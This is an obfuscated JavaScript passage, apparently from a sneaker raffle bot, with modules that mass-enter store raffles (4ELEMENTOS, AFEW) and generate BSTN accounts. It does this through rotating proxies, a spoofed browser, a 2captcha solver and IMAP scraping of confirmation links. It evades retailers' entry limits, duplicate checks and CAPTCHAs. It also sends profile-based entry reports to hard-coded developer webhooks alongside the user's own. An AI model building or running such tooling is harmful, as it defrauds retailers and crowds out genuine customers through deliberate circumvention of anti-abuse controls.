                            }), await _0x41cbe3['setRequestInterception'](!![]), _0x41cbe3['on']('request', _0x5d2969 => {
                                _0x5d2969['resourceType']() === 'image' || _0x5d2969['resourceType']() === 'font' || _0x5d2969['resourceType']() === 'media' ? _0x5d2969['abort']() : _0x5d2969['continue']();
                            }), await _0x41cbe3['goto'](_0x33dabb[_0x4a3fb7]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x41cbe3['waitForSelector']('#accept-all-gdpr'), await _0x41cbe3['click']('#accept-all-gdpr'), await _0x41cbe3['waitForSelector']('#raffles-product'), await _0x38c39e(0x3e8), await _0x41cbe3['$eval']('#raffles-product', _0xc39d95 => _0xc39d95['click']()), await _0x38c39e(0x1388), await _0x41cbe3['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x188d75 = await _0x41cbe3['$']('.fancybox-inner\x20>\x20iframe'), _0x161fa1 = await _0x188d75['contentFrame']();
                            console['log'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Checking\x20Information'), await _0x161fa1['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x38c39e(0x1f4), await _0x161fa1['type']('input[name=\x22sm-form-email\x22]', _0x33dabb[_0x4a3fb7]['Email']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-name\x22]', _0x33dabb[_0x4a3fb7]['FirstName'] + '\x20' + _0x33dabb[_0x4a3fb7]['LastName']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-street\x22]', _0x33dabb[_0x4a3fb7]['Address1'] + '\x20' + _0x33dabb[_0x4a3fb7]['HouseNumber'] + '\x20' + _0x33dabb[_0x4a3fb7]['Address2']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-city\x22]', _0x33dabb[_0x4a3fb7]['City']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-province\x22]', _0x33dabb[_0x4a3fb7]['State']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-zip\x22]', _0x33dabb[_0x4a3fb7]['Zip']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-country\x22]', _0x33dabb[_0x4a3fb7]['Country']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-form-phone\x22]', _0x33dabb[_0x4a3fb7]['Phone']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x33dabb[_0x4a3fb7]['Follower']), await _0x38c39e(0xc8), await _0x161fa1['type']('input[name=\x22sm-cst.size\x22]', _0x33dabb[_0x4a3fb7]['Size']), await _0x38c39e(0x1f4), await _0x161fa1['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x38c39e(0x1f4), await _0x161fa1['click']('.icheckbox_simple-custom'), await _0x38c39e(0x1f4), console['log'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Sending\x20Request'), await _0x161fa1['$eval']('form', _0x2cccd0 => _0x2cccd0['submit']()), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x19f5ce = '';
                            var _0x40d2d7 = await _0x485032(_0x33dabb[_0x4a3fb7], _0x438e92, 'dev', ![]), _0x3d8e54 = await _0x485032(_0x33dabb[_0x4a3fb7], _0x438e92, 'pub', ![]);
                            const _0x884424 = {
                                'succesDEVMSG': { 'embeds': [_0x40d2d7] },
                                'succesPUBMSG': { 'embeds': [_0x3d8e54] }
                            };
                            try {
                                _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x884424['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x884424['succesDEVMSG']), await _0x38c39e(0xc8), await _0x16a920(_0x2766d4, _0x884424['succesPUBMSG']);
                            } catch (_0x2ab9cc) {
                                console['log'](_0x52c84d['yellow'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2ab9cc));
                            }
                        } catch (_0x3d32bc) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20' + _0x3d32bc)), _0x2a7cc3 = '' + _0x3d32bc;
                            var _0x34bd7b = await _0x485032(_0x33dabb[_0x4a3fb7], _0x438e92, 'dev', !![], _0x2a7cc3), _0x40d2d7 = await _0x485032(_0x33dabb[_0x4a3fb7], _0x438e92, 'dev', ![]), _0x3d8e54 = await _0x485032(_0x33dabb[_0x4a3fb7], _0x438e92, 'pub', ![]);
                            const _0xfa981c = {
                                'succesDEVMSG': { 'embeds': [_0x40d2d7] },
                                'succesPUBMSG': { 'embeds': [_0x3d8e54] }
                            };
                            _0xfa981c['errorDEV'] = { 'embeds': [_0x34bd7b] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0xfa981c['errorDEV']), await _0x16a920(_0x233d0f, _0xfa981c['errorDEV']), _0x3d32bc != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x19f5ce = 'yes');
                        } finally {
                            _0x228442['close']();
                            if (_0x19f5ce == 'yes' && _0x17887d != 0x5 && _0x2a7cc3 != 'Size\x20Not\x20Found') {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Task\x20' + (_0x4a3fb7 + 0x1) + '\x20:\x20Retrying')), _0x4a3fb7 = _0x4a3fb7 - 0x1, _0x17887d = _0x17887d + 0x1;
                                continue;
                            }
                            _0x19f5ce == 'yes' && _0x17887d >= 0x5 && (_0x1ac5d5(_0x33dabb[_0x4a3fb7], _0x438e92), _0x19f5ce = 'no', _0x17887d = 0x0), console['log'](_0x21c871() + '\x20[' + _0x438e92['name'] + ']\x20Waiting\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x55f45c, _0x8c5b14) {
                    var _0x330b0d = [];
                    async function _0x4173d2() {
                        var _0xe245c = new _0xdc01cc({
                            'user': _0x5e160d['masterMail'],
                            'password': _0x5e160d['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x39a2b4(_0xffa087) {
                            _0xe245c['openBox']('INBOX', ![], _0xffa087);
                        }
                        _0xe245c['once']('ready', function () {
                            _0x39a2b4(function (_0xf95314, _0x1a3cb6) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0xf95314)
                                    throw _0xf95314;
                                _0xe245c['seq']['search'](['UNSEEN'], function (_0x41300a, _0x2052a1) {
                                    if (!_0x2052a1 || !_0x2052a1['length'])
                                        console['log'](_0x21c871() + '\x20[' + _0x55f45c['name'] + ']\x20No\x20mails\x20found'), _0xe245c['end']();
                                    else {
                                        var _0x54199b = _0xe245c['seq']['fetch'](_0x2052a1, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x54199b['on']('message', function (_0x3b4a6d, _0x41b26a) {
                                            var _0x7ccaf2 = '(#' + _0x41b26a + ')\x20';
                                            _0x3b4a6d['on']('body', function (_0x213ebe, _0x549770) {
                                                _0x31366c(_0x213ebe, (_0x36386d, _0x434ce0) => {
                                                    if (_0x434ce0['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x277fc4 = _0x434ce0['html']['split']('\x0a');
                                                        for (var _0x4e7f12 = 0x0; _0x4e7f12 < _0x277fc4['length']; _0x4e7f12++) {
                                                            if (_0x277fc4[_0x4e7f12]['includes']('salesmanago') && _0x277fc4[_0x4e7f12]['includes']('<td') && _0x277fc4[_0x4e7f12]['includes']('href')) {
                                                                var _0x5819e8 = _0x277fc4[_0x4e7f12]['split']('href=\x22'), _0xca3fb4 = _0x5819e8[0x1]['split']('\x22')[0x0];
                                                                _0x330b0d['push'](_0xca3fb4);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x3b4a6d['once']('end', function () {
                                            });
                                        }), _0x54199b['once']('error', function (_0x88c289) {
                                            console['log']('Fetch\x20error:\x20' + _0x88c289);
                                        }), _0x54199b['once']('end', function () {
                                            _0xe245c['end']();
                                        });
                                    }
                                });
                            });
                        }), _0xe245c['once']('error', function (_0xb66e66) {
                            console['log'](_0x52c84d['red'](_0xb66e66['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0xe245c['once']('end', async function () {
                        }), _0xe245c['connect']();
                    }
                    async function _0x3e1462(_0x4aa757, _0x3715f7, _0x20fc7e) {
                        for (var _0x49d628 = 0x0; _0x49d628 < _0x3715f7['length']; _0x49d628++) {
                            async function _0xdae175(_0x1e0efa, _0x30cb44, _0x3e0185, _0x5630a0, _0x1a0574) {
                                var _0x44d1b2, _0x270ef4 = {}, _0x28a94f = [], _0x38ad8e = {}, _0x22e5fb = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x1a2d30 = Math['round'](Math['random']() * (_0x22e5fb['length'] - 0x1));
                                _0x5630a0[_0x1e0efa]['Size'] == 'RANDOM' && (_0x5630a0[_0x1e0efa]['Size'] = _0x22e5fb[_0x1a2d30]);
                                !_0x5630a0 && (_0x5630a0 = {});
                                if (_0x5e160d['useRandomProxy'] = ![])
                                    var _0xc64872 = _0x1a0574[_0x1e0efa]['split'](':');
                                else
                                    var _0xc5091d = Math['round'](Math['random']() * (_0x1a0574['length'] - 0x1)), _0xc64872 = _0x1a0574[_0xc5091d]['split'](':');
                                var _0x38986 = {
                                    'jar': _0xe4a440,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x3e0185['url'],
                                    'headers': _0x3e0185['headers'],
                                    'body': JSON['stringify'](_0x270ef4),
                                    'proxy': 'http://' + _0xc64872[0x2] + ':' + _0xc64872[0x3] + '@' + _0xc64872[0x0] + ':' + _0xc64872[0x1]
                                };
                                return _0x30cb44 != 'ver' && (_0x38986['url'] = _0x3e0185['url'], _0x38986['headers'] = _0x3e0185['headers']), _0x30cb44 == 'ver' && (_0x38986['method'] = 'GET', _0x38986['url'] = _0x5630a0[_0x1e0efa]), new Promise(function (_0x82cf20, _0xee98dc) {
                                    callback = async (_0x3316a7, _0x727d84, _0x3fee59) => {
                                        if (!_0x3316a7 && _0x727d84['statusCode'] == 0xca || !_0x3316a7 && _0x727d84['statusCode'] == 0xc8) {
                                            if (_0x30cb44 != 'ver') {
                                                var _0x56259b = await _0x485032(_0x5630a0[_0x1e0efa], _0x3e0185, 'dev', ![]), _0x2baa41 = await _0x485032(_0x5630a0[_0x1e0efa], _0x3e0185, 'pub', ![]);
                                                const _0x3432c7 = {
                                                    'succesDEVMSG': { 'embeds': [_0x56259b] },
                                                    'succesPUBMSG': { 'embeds': [_0x2baa41] }
                                                };
                                                if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                                    try {
                                                        await _0x16a920(_0x5e160d['webhook'], _0x3432c7['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x3432c7['succesDEVMSG']), await _0x38c39e(0xc8);
                                                try {
                                                    await _0x16a920(_0x2766d4, _0x3432c7['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x41f993(_0x5630a0[_0x1e0efa], _0x3e0185);
                                            }
                                            _0x82cf20(console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x3e0185['name'] + ']\x20Task\x20' + (_0x1e0efa + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x30cb44 != 'ver') {
                                                var _0x2f85b2 = '' + _0x3316a7, _0x58a555 = await _0x485032(_0x5630a0[_0x1e0efa], _0x3e0185, 'dev', !![], _0x2f85b2), _0x123dfb = {};
                                                _0x123dfb['errorDEV'] = { 'embeds': [_0x58a555] }, _0x1ac5d5(_0x5630a0[_0x1e0efa], _0x3e0185), _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x123dfb['errorDEV']), await _0x16a920(_0x233d0f, _0x123dfb['errorDEV']);
                                            }
                                            _0xee98dc(console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x3e0185['name'] + ']\x20Task\x20' + (_0x1e0efa + 0x1) + ':\x20' + _0x3316a7)));
                                        }
                                    };
                                    try {
                                        _0x30cb44 != 'ver' ? console['log'](_0x21c871() + '\x20[' + _0x3e0185['name'] + ']\x20Task\x20' + (_0x1e0efa + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x270ef4['data']['attributes']['email']) : console['log'](_0x21c871() + '\x20[' + _0x3e0185['name'] + ']\x20Task\x20' + (_0x1e0efa + 0x1) + ':\x20Fetching\x20Response'), _0x247acd(_0x38986, callback);
                                    } catch (_0x16388a) {
                                        console['log'](_0x21c871() + '\x20Task\x20' + (_0x1e0efa + 0x1) + ':\x20' + _0x16388a);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0xdae175(_0x49d628, 'ver', _0x4aa757, _0x3715f7, _0x20fc7e), console['log'](_0x21c871() + '\x20[' + _0x4aa757['name'] + ']\x20Sleeping\x20for\x20' + _0x5e160d['delay'] + '\x20ms'), await _0x38c39e(_0x5e160d['delay']);
                            } catch (_0x2ddd66) {
                            }
                        }
                    }
                    try {
                        _0x4173d2(), await _0x38c39e(0xfa0), console['log']('Found\x20' + _0x330b0d['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x3e1462(_0x55f45c, _0x330b0d, _0x8c5b14);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x957622, _0x3e1e55, _0x286a1d) {
                for (var _0x24aa30 = 0x0; _0x24aa30 < _0x3e1e55['length']; _0x24aa30++) {
                    _0x5e160d['AfewDelay'] = _0x5e160d['delay'];
                    var _0x5dc98c;
                    if (_0x411b99 != 'yes')
                        var _0x411b99 = '', _0x1c20e0 = 0x0;
                    var _0x20d4c1 = _0x3e1e55[_0x24aa30]['Url'];
                    _0x2ad028(_0x957622['name'] + '\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20/\x20' + _0x3e1e55['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92), await _0x3962cc(_0x3e1e55, _0x24aa30);
                    var _0x294907 = await _0x485032(_0x3e1e55[_0x24aa30], _0x957622, 'dev', ![]), _0x499966 = await _0x485032(_0x3e1e55[_0x24aa30], _0x957622, 'pub', ![]);
                    const _0x5ce4df = {
                        'succesDEVMSG': { 'embeds': [_0x294907] },
                        'succesPUBMSG': { 'embeds': [_0x499966] }
                    };
                    if (_0x3e1e55[_0x24aa30]['Email'] == '' || _0x3e1e55[_0x24aa30]['FirstName'] == '' || _0x3e1e55[_0x24aa30]['LastName'] == '' || _0x3e1e55[_0x24aa30]['Country'] == '' || _0x3e1e55[_0x24aa30]['Size'] == '' || _0x3e1e55[_0x24aa30]['Address1'] == '' || _0x3e1e55[_0x24aa30]['Zip'] == '') {
                        console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5e160d['useRandomProxy'] = ![])
                        var _0x24621e = _0x286a1d[_0x24aa30]['split'](':');
                    else
                        var _0x5d030a = Math['round'](Math['random']() * (_0x286a1d['length'] - 0x1)), _0x24621e = _0x286a1d[_0x5d030a]['split'](':');
                    const _0x29e0be = await _0x3d68d8['launch']({
                        'headless': !![],
                        'args': [
                            '--proxy-server=' + _0x24621e[0x0] + ':' + _0x24621e[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x3ec85e = await _0x29e0be['newPage']();
                        await _0x3ec85e['setDefaultNavigationTimeout'](0x1d4c0), await _0x3ec85e['authenticate']({
                            'username': '' + _0x24621e[0x2],
                            'password': '' + _0x24621e[0x3]
                        }), console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x3ec85e['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x3ec85e['setRequestInterception'](!![]), _0x3ec85e['on']('request', _0x18a72d => {
                            _0x18a72d['resourceType']() === 'image' || _0x18a72d['resourceType']() === 'font' || _0x18a72d['resourceType']() === 'media' ? _0x18a72d['abort']() : _0x18a72d['continue']();
                        }), await _0x3ec85e['goto'](_0x20d4c1, { 'waitUntil': 'networkidle2' }), console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x3ec85e['waitForTimeout'](0xfa0), console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x3ec85e['waitForTimeout'](0x320);
                        if (_0x3e1e55[_0x24aa30]['Size'] == 'RANDOM') {
                            console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                            const _0x2bf047 = await _0x3ec85e['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x3a1804 => {
                                return _0x3a1804['map'](_0x412aa0 => _0x412aa0['href']);
                            });
                            var _0x4b64c1 = Math['round'](Math['random']() * (_0x2bf047['length'] - 0x1));
                            await _0x3ec85e['goto']('' + _0x2bf047[_0x4b64c1]);
                        } else {
                            console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x3e1e55[_0x24aa30]['Size']);
                            try {
                                const _0x4a3cb3 = await _0x3ec85e['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x3e1e55[_0x24aa30]['Size'] + '\x22]\x20>\x20a', _0x1650e8 => {
                                    return _0x1650e8['map'](_0x481afa => _0x481afa['href']);
                                });
                                await _0x3ec85e['goto']('' + _0x4a3cb3[0x0], { 'waitUntil': 'networkidle2' });
                            } catch (_0x345b5e) {
                                console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20' + _0x345b5e + '\x20Size\x20not\x20found')), _0x5dc98c = 'Size\x20Not\x20Found';
                                var _0x26a2a9 = await _0x485032(_0x3e1e55[_0x24aa30], _0x957622, 'dev', !![], _0x5dc98c);
                                _0x5ce4df['errorDEV'] = { 'embeds': [_0x26a2a9] };
                                _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x5ce4df['errorDEV']);
                                await _0x16a920(_0x233d0f, _0x5ce4df['errorDEV']);
                                continue;
                            }
                        }
                        await _0x3ec85e['waitForTimeout'](0x258), await _0x3ec85e['type']('#raffle-instagram', '' + _0x3e1e55[_0x24aa30]['Follower'], { 'delay': 0x64 }), await _0x3ec85e['waitForTimeout'](0x384), await _0x3ec85e['click']('#raffle-terms'), await _0x3ec85e['waitForTimeout'](0x384), await _0x3ec85e['evaluate'](() => {
                            const _0x30208a = document['querySelector']('button.btn[name=\x27add\x27]');
                            _0x30208a['click']();
                        }), await _0x3ec85e['waitForTimeout'](0xbb8), await _0x3ec85e['waitForSelector']('#checkout_email'), await _0x38c39e(0x3e8), console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x3ec85e['type']('#checkout_email', '' + _0x3e1e55[_0x24aa30]['Email'], 0x32), await _0x38c39e(0x320), await _0x3ec85e['select']('#checkout_shipping_address_country', '' + _0x3e1e55[_0x24aa30]['Country']), await _0x3ec85e['waitForTimeout'](0x258), await _0x3ec85e['type']('#checkout_shipping_address_first_name', '' + _0x3e1e55[_0x24aa30]['FirstName']), await _0x3ec85e['waitForTimeout'](0x320), await _0x3ec85e['type']('#checkout_shipping_address_last_name', '' + _0x3e1e55[_0x24aa30]['LastName']), await _0x3ec85e['waitForTimeout'](0x2bc), await _0x3ec85e['type']('#checkout_shipping_address_address1', _0x3e1e55[_0x24aa30]['Address1'] + '\x20' + _0x3e1e55[_0x24aa30]['HouseNumber']), await _0x3ec85e['waitForTimeout'](0x2bc), await _0x3ec85e['type']('#checkout_shipping_address_address2', '' + _0x3e1e55[_0x24aa30]['Address2']), await _0x3ec85e['waitForTimeout'](0x2bc);
                        _0x3e1e55[_0x24aa30]['Postcode'] == undefined ? await _0x3ec85e['type']('#checkout_shipping_address_zip', '' + _0x3e1e55[_0x24aa30]['Zip']) : await _0x3ec85e['type']('#checkout_shipping_address_zip', '' + _0x3e1e55[_0x24aa30]['Postcode']);
                        await _0x3ec85e['waitForTimeout'](0x2bc), await _0x3ec85e['type']('#checkout_shipping_address_city', '' + _0x3e1e55[_0x24aa30]['City']), await _0x3ec85e['waitForTimeout'](0x2bc), console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Getting\x20Shipping'), await _0x3ec85e, _0x3ec85e['evaluate'](() => {
                            const _0x2ff13f = document['querySelector']('#continue_button');
                            for (var _0x30d4e9 = 0x0; _0x30d4e9 < 0x5; _0x30d4e9++) {
                                if (_0x2ff13f) {
                                    _0x2ff13f['click'](), _0x2ff13f['click']();
                                    break;
                                } else
                                    _0x38c39e(0xfa0);
                            }
                        }), await _0x3ec85e['waitForTimeout'](0x1194);
                        try {
                            await _0x3ec85e['waitForSelector']('div.radio-wrapper', { 'timeout': 0x186a0 });
                        } catch {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Proxy\x20Error'));
                            continue;
                        }
                        _0x3ec85e['evaluate'](() => {
                            const _0x29e3ee = document['querySelector']('#continue_button');
                            for (var _0x48f4d7 = 0x0; _0x48f4d7 < 0x5; _0x48f4d7++) {
                                if (_0x29e3ee) {
                                    _0x29e3ee['click']();
                                    break;
                                } else
                                    _0x38c39e(0xfa0);
                            }
                        }), await _0x3ec85e['waitForTimeout'](0x7d0), console['log'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x3ec85e['waitForSelector']('#continue_button', { 'timeout': 0x186a0 }), _0x3ec85e['evaluate'](() => {
                            const _0x311984 = document['querySelector']('#continue_button');
                            for (var _0x2418ad = 0x0; _0x2418ad < 0x5; _0x2418ad++) {
                                if (_0x311984) {
                                    _0x311984['click']();
                                    break;
                                } else
                                    _0x38c39e(0xfa0);
                            }
                        }), await _0x3ec85e['waitForTimeout'](0x1194), await _0x3ec85e['waitForSelector']('#continue_button'), _0x3ec85e['evaluate'](() => {
                            const _0x572b9e = document['querySelector']('#continue_button');
                            for (var _0x58c420 = 0x0; _0x58c420 < 0x5; _0x58c420++) {
                                if (_0x572b9e) {
                                    _0x572b9e['click']();
                                    break;
                                } else
                                    _0x38c39e(0xfa0);
                            }
                        });
                        try {
                            await _0x3ec85e['waitForSelector']('div[data-step=\x22thank_you\x22]'), _0x411b99 = 'no', _0x41f993(_0x3e1e55[_0x24aa30], _0x957622), console['log'](_0x52c84d['green'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                            if (_0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '')
                                try {
                                    await _0x16a920(_0x5e160d['webhook'], _0x5ce4df['succesDEVMSG']);
                                } catch {
                                }
                            await _0x38c39e(0xc8), await _0x16a920(_0x4f82a9, _0x5ce4df['succesDEVMSG']), await _0x38c39e(0xc8);
                            try {
                                await _0x16a920(_0x2766d4, _0x5ce4df['succesPUBMSG']);
                            } catch {
                            }
                        } catch (_0x2c8c7b) {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Entry\x20Failed:\x20' + _0x2c8c7b));
                        }
                    } catch (_0x1a81f5) {
                        console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20' + _0x1a81f5)), _0x5dc98c = '' + _0x1a81f5;
                        var _0x26a2a9 = await _0x485032(_0x3e1e55[_0x24aa30], _0x957622, 'dev', !![], _0x5dc98c);
                        _0x5ce4df['errorDEV'] = { 'embeds': [_0x26a2a9] }, _0x5e160d['webhook'] != undefined && _0x5e160d['webhook'] != '' && await _0x16a920(_0x5e160d['webhook'], _0x5ce4df['errorDEV']), await _0x16a920(_0x233d0f, _0x5ce4df['errorDEV']), _0x411b99 = 'yes';
                    } finally {
                        _0x29e0be && _0x29e0be['close']();
                        if (_0x411b99 == 'yes' && _0x1c20e0 != 0x5 && _0x5dc98c != 'Size\x20Not\x20Found') {
                            console['log'](_0x52c84d['red'](_0x21c871() + '\x20[' + _0x957622['name'] + ']\x20Task\x20' + (_0x24aa30 + 0x1) + '\x20:\x20Retrying')), _0x24aa30 = _0x24aa30 - 0x1, _0x1c20e0 = _0x1c20e0 + 0x1;
                            continue;
                        }
                        _0x411b99 == 'yes' && _0x1c20e0 >= 0x5 && (_0x1ac5d5(_0x3e1e55[_0x24aa30], _0x957622), _0x411b99 = 'no', _0x1c20e0 = 0x0);
                        if (_0x24aa30 + 0x1 == _0x3e1e55['length']) {
                            await _0x38c39e(0x7d0);
                            break;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5e160d['AfewDelay'] + '\x20ms'), await _0x38c39e(_0x5e160d['AfewDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'BSTN',
        'modules': [
            {
                'name': 'BSTN\x20Account\x20Generator',
                'store': 'BSTN',
                'logo': 'https://www.snkrempire.com/wp-content/uploads/2017/11/E3QHwMSP_400x400.png',
                'function': async function (_0x427332, _0x2ed855, _0xbe366b) {
                    _0x3d68d8['use'](_0x4dfb83()), _0x3d68d8['use'](_0x2efef1({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5e160d['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x111f4a = 0x0; _0x111f4a < _0x2ed855['length']; _0x111f4a++) {
                        if (_0x3b87d5 != 'yes')
                            var _0x3b87d5 = '', _0x466a72 = 0x0;
                        var _0x27cfe0;
                        await _0x3962cc(_0x2ed855, _0x111f4a), _0x2ad028(_0x427332['name'] + '\x20Task\x20' + (_0x111f4a + 0x1) + '\x20/\x20' + _0x2ed855['length'] + '\x20||\x20File:\x20' + _0x4d0da0 + '\x20Proxies:\x20' + _0x63ed92);
                        var _0x184c2b = await _0x485032(_0x2ed855[_0x111f4a], _0x427332, 'acc', ![]);
                        const _0x3112f7 = { 'succesDEVMSG': { 'embeds': [_0x184c2b] } }, _0x3ff0ad = 'https://www.bstn.com/eu_en/customer/account/create/';
                        var _0x25be80 = Math['round'](Math['random']() * (_0xbe366b['length'] - 0x1)), _0x5c2ad2 = _0xbe366b[_0x25be80]['split'](':');
                        const _0x9b8c33 = await _0x3d68d8['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x5c2ad2[0x0] + ':' + _0x5c2ad2[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x43d847 = await _0x9b8c33['newPage']();
                            await _0x43d847['authenticate']({
                                'username': '' + _0x5c2ad2[0x2],
                                'password': '' + _0x5c2ad2[0x3]
